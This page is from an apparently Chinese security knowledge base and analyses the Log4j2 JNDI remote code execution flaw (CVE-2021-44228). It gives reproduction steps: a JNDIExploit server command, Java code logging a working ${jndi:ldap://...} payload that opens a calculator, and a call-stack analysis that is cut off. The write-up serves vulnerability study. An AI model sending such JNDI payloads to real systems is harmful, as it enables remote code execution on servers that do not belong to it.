<!doctype html>
<html lang="zh-Hans" dir="ltr" class="docs-wrapper plugin-docs plugin-id-default docs-version-current docs-doc-page docs-doc-id-代码审计/Java安全/应用漏洞分析/log4j2_rce分析" data-has-hydrated="false">
<head>
<meta charset="UTF-8">
<meta name="generator" content="Docusaurus v3.8.1">
<title data-rh="true">log4j2_rce分析 | d4m1ts 知识库</title><meta data-rh="true" name="viewport" content="width=device-width,initial-scale=1"><meta data-rh="true" name="twitter:card" content="summary_large_image"><meta data-rh="true" property="og:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" name="twitter:image" content="https://blog.gm7.org/img/docusaurus-social-card.jpg"><meta data-rh="true" property="og:url" content="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析"><meta data-rh="true" property="og:locale" content="zh_Hans"><meta data-rh="true" name="docusaurus_locale" content="zh-Hans"><meta data-rh="true" name="docsearch:language" content="zh-Hans"><meta data-rh="true" name="docusaurus_version" content="current"><meta data-rh="true" name="docusaurus_tag" content="docs-default-current"><meta data-rh="true" name="docsearch:version" content="current"><meta data-rh="true" name="docsearch:docusaurus_tag" content="docs-default-current"><meta data-rh="true" property="og:title" content="log4j2_rce分析 | d4m1ts 知识库"><meta data-rh="true" name="description" content="前言"><meta data-rh="true" property="og:description" content="前言"><link data-rh="true" rel="icon" href="/img/favicon.ico"><link data-rh="true" rel="canonical" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析" hreflang="zh-Hans"><link data-rh="true" rel="alternate" href="https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析" hreflang="x-default"><link data-rh="true" rel="preconnect" href="https://0LMFVYF6KV-dsn.algolia.net" crossorigin="anonymous"><script data-rh="true" type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"代码审计","item":"https://blog.gm7.org/docs/代码审计/"},{"@type":"ListItem","position":2,"name":"应用漏洞分析","item":"https://blog.gm7.org/docs/category/应用漏洞分析"},{"@type":"ListItem","position":3,"name":"log4j2_rce分析","item":"https://blog.gm7.org/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析"}]}</script><link rel="alternate" type="application/rss+xml" href="/blog/rss.xml" title="d4m1ts 知识库 RSS Feed">
<link rel="alternate" type="application/atom+xml" href="/blog/atom.xml" title="d4m1ts 知识库 Atom Feed">




<link rel="search" type="application/opensearchdescription+xml" title="d4m1ts 知识库" href="/opensearch.xml"><link rel="stylesheet" href="/assets/css/styles.933499b4.css">
<script src="/assets/js/runtime~main.188591bd.js" defer="defer"></script>
<script src="/assets/js/main.f3e1b88f.js" defer="defer"></script>
</head>
<body class="navigation-with-keyboard">
<svg xmlns="http://www.w3.org/2000/svg" style="display: none;"><defs>
<symbol id="theme-svg-external-link" viewBox="0 0 24 24"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"/></symbol>
</defs></svg>
<script>!function(){var t="light";var e=function(){try{return new URLSearchParams(window.location.search).get("docusaurus-theme")}catch(t){}}()||function(){try{return window.localStorage.getItem("theme")}catch(t){}}();document.documentElement.setAttribute("data-theme",e||t),document.documentElement.setAttribute("data-theme-choice",e||t)}(),function(){try{const c=new URLSearchParams(window.location.search).entries();for(var[t,e]of c)if(t.startsWith("docusaurus-data-")){var a=t.replace("docusaurus-data-","data-");document.documentElement.setAttribute(a,e)}}catch(t){}}()</script><div id="__docusaurus"><link rel="preload" as="image" href="/img/logo.svg"><div role="region" aria-label="跳到主要内容"><a class="skipToContent_fXgn" href="#__docusaurus_skipToContent_fallback">跳到主要内容</a></div><nav aria-label="主导航" class="theme-layout-navbar navbar navbar--fixed-top"><div class="navbar__inner"><div class="theme-layout-navbar-left navbar__items"><button aria-label="切换导航栏" aria-expanded="false" class="navbar__toggle clean-btn" type="button"><svg width="30" height="30" viewBox="0 0 30 30" aria-hidden="true"><path stroke="currentColor" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" d="M4 7h22M4 15h22M4 23h22"></path></svg></button><a class="navbar__brand" href="/"><div class="navbar__logo"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--light_NVdE"><img src="/img/logo.svg" alt="logo" class="themedComponent_mlkZ themedComponent--dark_xIcU"></div><b class="navbar__title text--truncate"></b></a><a aria-current="page" class="navbar__item navbar__link navbar__link--active" href="/docs/intro">知识库</a></div><div class="theme-layout-navbar-right navbar__items navbar__items--right"><a href="https://github.com/damit5/damit5.github.io" target="_blank" rel="noopener noreferrer" class="navbar__item navbar__link">GitHub<svg width="13.5" height="13.5" aria-hidden="true" class="iconExternalLink_nPIU"><use href="#theme-svg-external-link"></use></svg></a><div class="toggle_vylO colorModeToggle_DEke"><button class="clean-btn toggleButton_gllP toggleButtonDisabled_aARS" type="button" disabled="" title="system mode" aria-label="切换浅色/暗黑模式（当前为system mode）"><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP lightToggleIcon_pyhR"><path fill="currentColor" d="M12,9c1.65,0,3,1.35,3,3s-1.35,3-3,3s-3-1.35-3-3S10.35,9,12,9 M12,7c-2.76,0-5,2.24-5,5s2.24,5,5,5s5-2.24,5-5 S14.76,7,12,7L12,7z M2,13l2,0c0.55,0,1-0.45,1-1s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S1.45,13,2,13z M20,13l2,0c0.55,0,1-0.45,1-1 s-0.45-1-1-1l-2,0c-0.55,0-1,0.45-1,1S19.45,13,20,13z M11,2v2c0,0.55,0.45,1,1,1s1-0.45,1-1V2c0-0.55-0.45-1-1-1S11,1.45,11,2z M11,20v2c0,0.55,0.45,1,1,1s1-0.45,1-1v-2c0-0.55-0.45-1-1-1C11.45,19,11,19.45,11,20z M5.99,4.58c-0.39-0.39-1.03-0.39-1.41,0 c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0s0.39-1.03,0-1.41L5.99,4.58z M18.36,16.95 c-0.39-0.39-1.03-0.39-1.41,0c-0.39,0.39-0.39,1.03,0,1.41l1.06,1.06c0.39,0.39,1.03,0.39,1.41,0c0.39-0.39,0.39-1.03,0-1.41 L18.36,16.95z M19.42,5.99c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06c-0.39,0.39-0.39,1.03,0,1.41 s1.03,0.39,1.41,0L19.42,5.99z M7.05,18.36c0.39-0.39,0.39-1.03,0-1.41c-0.39-0.39-1.03-0.39-1.41,0l-1.06,1.06 c-0.39,0.39-0.39,1.03,0,1.41s1.03,0.39,1.41,0L7.05,18.36z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP darkToggleIcon_wfgR"><path fill="currentColor" d="M9.37,5.51C9.19,6.15,9.1,6.82,9.1,7.5c0,4.08,3.32,7.4,7.4,7.4c0.68,0,1.35-0.09,1.99-0.27C17.45,17.19,14.93,19,12,19 c-3.86,0-7-3.14-7-7C5,9.07,6.81,6.55,9.37,5.51z M12,3c-4.97,0-9,4.03-9,9s4.03,9,9,9s9-4.03,9-9c0-0.46-0.04-0.92-0.1-1.36 c-0.98,1.37-2.58,2.26-4.4,2.26c-2.98,0-5.4-2.42-5.4-5.4c0-1.81,0.89-3.42,2.26-4.4C12.92,3.04,12.46,3,12,3L12,3z"></path></svg><svg viewBox="0 0 24 24" width="24" height="24" aria-hidden="true" class="toggleIcon_g3eP systemToggleIcon_QzmC"><path fill="currentColor" d="m12 21c4.971 0 9-4.029 9-9s-4.029-9-9-9-9 4.029-9 9 4.029 9 9 9zm4.95-13.95c1.313 1.313 2.05 3.093 2.05 4.95s-0.738 3.637-2.05 4.95c-1.313 1.313-3.093 2.05-4.95 2.05v-14c1.857 0 3.637 0.737 4.95 2.05z"></path></svg></button></div><div class="navbarSearchContainer_Bca1"><button type="button" class="DocSearch DocSearch-Button" aria-label="搜索 (Command+K)"><span class="DocSearch-Button-Container"><svg width="20" height="20" class="DocSearch-Search-Icon" viewBox="0 0 20 20" aria-hidden="true"><path d="M14.386 14.386l4.0877 4.0877-4.0877-4.0877c-2.9418 2.9419-7.7115 2.9419-10.6533 0-2.9419-2.9418-2.9419-7.7115 0-10.6533 2.9418-2.9419 7.7115-2.9419 10.6533 0 2.9419 2.9418 2.9419 7.7115 0 10.6533z" stroke="currentColor" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg><span class="DocSearch-Button-Placeholder">搜索</span></span><span class="DocSearch-Button-Keys"></span></button></div></div></div><div role="presentation" class="navbar-sidebar__backdrop"></div></nav><div id="__docusaurus_skipToContent_fallback" class="theme-layout-main main-wrapper mainWrapper_z2l0"><div class="docsWrapper_hBAB"><button aria-label="回到顶部" class="clean-btn theme-back-to-top-button backToTopButton_sjWU" type="button"></button><div class="docRoot_UBD9"><aside class="theme-doc-sidebar-container docSidebarContainer_YfHR"><div class="sidebarViewport_aRkj"><div class="sidebar_njMd"><nav aria-label="文档侧边栏" class="menu thin-scrollbar menu_SIkG"><ul class="theme-doc-sidebar-menu menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/intro">Introduction</a></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" href="/docs/渗透测试/">渗透测试</a><button aria-label="展开侧边栏分类 &#x27;渗透测试&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" href="/docs/代码审计/">代码审计</a><button aria-label="折叠侧边栏分类 &#x27;代码审计&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret menu__link--active" role="button" aria-expanded="true" tabindex="0" href="/docs/category/审计基础">Java安全</a></div><ul class="menu__list"><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/审计基础">审计基础</a><button aria-label="展开侧边栏分类 &#x27;审计基础&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/反序列化链分析">反序列化链分析</a><button aria-label="展开侧边栏分类 &#x27;反序列化链分析&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--active" tabindex="0" href="/docs/category/应用漏洞分析">应用漏洞分析</a><button aria-label="折叠侧边栏分类 &#x27;应用漏洞分析&#x27;" aria-expanded="true" type="button" class="clean-btn menu__caret"></button></div><ul class="menu__list"><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/log4j反序列化漏洞分析">log4j反序列化漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson 1.2.24反序列化漏洞分析">Fastjson 1.2.24反序列化漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson的dnslog探测方式分析">Fastjson的dnslog探测方式分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson各版本漏洞分析">Fastjson各版本漏洞分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/Fastjson1.2.68分析">Fastjson1.2.68分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link menu__link--active" aria-current="page" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/log4j2_rce分析">log4j2_rce分析</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-4 menu__list-item"><a class="menu__link" tabindex="0" href="/docs/代码审计/Java安全/应用漏洞分析/IDEA远程调试Shiro550">IDEA远程调试Shiro550</a></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/rce回显链">RCE回显链</a><button aria-label="展开侧边栏分类 &#x27;RCE回显链&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/内存马">内存马</a><button aria-label="展开侧边栏分类 &#x27;内存马&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-3 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/杂项">杂项</a><button aria-label="展开侧边栏分类 &#x27;杂项&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/cc">C:C++</a><button aria-label="展开侧边栏分类 &#x27;C:C++&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-2 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist" tabindex="0" href="/docs/category/codeql">codeql</a><button aria-label="展开侧边栏分类 &#x27;codeql&#x27;" aria-expanded="false" type="button" class="clean-btn menu__caret"></button></div></li></ul></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/编程开发/GO/GO基础/">编程开发</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/前置基础知识">移动安全</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/应急响应/简介/">应急响应</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/category/日常使用">AI</a></div></li><li class="theme-doc-sidebar-item-category theme-doc-sidebar-item-category-level-1 menu__list-item menu__list-item--collapsed"><div class="menu__list-item-collapsible"><a class="menu__link menu__link--sublist menu__link--sublist-caret" role="button" aria-expanded="false" href="/docs/暂未分类/自建网盘/h5ai/">暂未分类</a></div></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/致谢">致谢</a></li><li class="theme-doc-sidebar-item-link theme-doc-sidebar-item-link-level-1 menu__list-item"><a class="menu__link" href="/docs/更新日志">更新日志</a></li></ul></nav></div></div></aside><main class="docMainContainer_TBSr"><div class="container padding-top--md padding-bottom--lg"><div class="row"><div class="col docItemCol_z5aJ"><div class="docItemContainer_c0TR"><article><nav class="theme-doc-breadcrumbs breadcrumbsContainer_Z_bl" aria-label="页面路径"><ul class="breadcrumbs"><li class="breadcrumbs__item"><a aria-label="主页面" class="breadcrumbs__link" href="/"><svg viewBox="0 0 24 24" class="breadcrumbHomeIcon_YNFT"><path d="M10 19v-5h4v5c0 .55.45 1 1 1h3c.55 0 1-.45 1-1v-7h1.7c.46 0 .68-.57.33-.87L12.67 3.6c-.38-.34-.96-.34-1.34 0l-8.36 7.53c-.34.3-.13.87.33.87H5v7c0 .55.45 1 1 1h3c.55 0 1-.45 1-1z" fill="currentColor"></path></svg></a></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/代码审计/"><span>代码审计</span></a></li><li class="breadcrumbs__item"><span class="breadcrumbs__link">Java安全</span></li><li class="breadcrumbs__item"><a class="breadcrumbs__link" href="/docs/category/应用漏洞分析"><span>应用漏洞分析</span></a></li><li class="breadcrumbs__item breadcrumbs__item--active"><span class="breadcrumbs__link">log4j2_rce分析</span></li></ul></nav><div class="tocCollapsible_ETCw theme-doc-toc-mobile tocMobile_bxCs"><button type="button" class="clean-btn tocCollapsibleButton_TO0P">本页总览</button></div><div class="theme-doc-markdown markdown"><header><h1>log4j2_rce分析</h1></header><h2 class="anchor anchorWithStickyNavbar_LWe7" id="前言">前言<a href="#前言" class="hash-link" aria-label="前言的直接链接" title="前言的直接链接">​</a></h2>
<p>2021年11月24日，阿里云安全团队向Apache官方报告了Apache Log4j2远程代码执行漏洞。</p>
<p>2021年12月9日晚，各大公众号突然发布漏洞预警</p>
<p>2021年12月10日晚，各大公众号开始蹭热度</p>
<hr>
<p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
<p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行。（<a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-95914" target="_blank" rel="noopener noreferrer">CNVD-2021-95914</a>、CVE-2021-44228）</strong></p>
<p>影响版本：<code>Apache Log4j 2.x &lt;= 2.15.0-rc1</code></p>
<blockquote>
<p>2.15.0-rc1 存在补丁绕过，但是很鸡肋</p>
</blockquote>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="复现">复现<a href="#复现" class="hash-link" aria-label="复现的直接链接" title="复现的直接链接">​</a></h2>
<p>老规矩，先复现，再分析</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="pomxml">pom.xml<a href="#pomxml" class="hash-link" aria-label="pom.xml的直接链接" title="pom.xml的直接链接">​</a></h3>
<ul>
<li>Jdk8u111</li>
<li><code>log4j-api</code>不是必须</li>
</ul>
<div class="language-xml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-xml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.logging.log4j</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">log4j-core</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">2.14.1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token comment" style="color:#999988;font-style:italic">&lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">org.apache.logging.log4j</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">groupId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">log4j-api</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">artifactId</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">            </span><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain">2.14.1</span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">version</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">dependency</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="启动jndi注入server">启动JNDI注入Server<a href="#启动jndi注入server" class="hash-link" aria-label="启动JNDI注入Server的直接链接" title="启动JNDI注入Server的直接链接">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">java</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-jar</span><span class="token plain"> JNDIExploit-1.2-SNAPSHOT.jar </span><span class="token parameter variable" style="color:#36acaa">-i</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">127.0</span><span class="token plain">.0.1</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="漏洞代码">漏洞代码<a href="#漏洞代码" class="hash-link" aria-label="漏洞代码的直接链接" title="漏洞代码的直接链接">​</a></h3>
<div class="language-java codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-java codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.logging.log4j.LogManager;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">import org.apache.logging.log4j.Logger;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">public class Test {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    private static final Logger logger = LogManager.getLogger(Test.class);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    public static void main(String[] args) {</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        logger.error(&quot;${jndi:ldap://127.0.0.1:1389/Basic/Command/Base64/b3BlbiAtbmEgQ2FsY3VsYXRvcgo=}&quot;);</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    }</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">}</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="效果">效果<a href="#效果" class="hash-link" aria-label="效果的直接链接" title="效果的直接链接">​</a></h3>
<p><img decoding="async" loading="lazy" alt="image-20211210091451769" src="/assets/images/image-20211210091451769-e63a8fa2c072d9a6c14a9a9dfd059a7c.png" width="2932" height="538" class="img_ev3q"></p>
<p><img decoding="async" loading="lazy" alt="image-20211210091345232" src="/assets/images/image-20211210091345232-8a509e856a30aa1c9ced9c7dcf4395b0.png" width="3582" height="1774" class="img_ev3q"></p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="分析">分析<a href="#分析" class="hash-link" aria-label="分析的直接链接" title="分析的直接链接">​</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="调用栈">调用栈<a href="#调用栈" class="hash-link" aria-label="调用栈的直接链接" title="调用栈的直接链接">​</a></h3>
<p>在利用过程中，因为我们明确知道要执行系统命令调用<code>java.lang.Runtime#exec(java.lang.String[])</code>，所以在<code>exec</code>方法处下断点，分析一下调用栈</p>
<p><img decoding="async" loading="lazy" alt="image-20211210093916217" src="/assets/images/image-20211210093916217-6e016ab9536bfb01da0d4ba29be2a96b.png" width="1808" height="1222" class="img_ev3q"></p>
<p>运行获取调用栈</p>
<p><img decoding="async" loading="lazy" alt="image-20211210093957700" src="/assets/images/image-20211210093957700-cf58c3038c2bebb2954a84d35d0ba646.png" width="2022" height="2200" class="img_ev3q"></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">exec:485, Runtime (java.lang)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">&lt;init&gt;:-1, ExploitgJlWqLWBF3</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">newInstance:62, NativeConstructorAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">newInstance:423, Constructor (java.lang.reflect)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">newInstance:442, Class (java.lang)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">getObjectInstance:189, DirectoryManager (javax.naming.spi)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">c_lookup:1085, LdapCtx (com.sun.jndi.ldap)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">p_lookup:542, ComponentContext (com.sun.jndi.toolkit.ctx)</span><br></span><span class="token-line" style="color:#393A34"><span 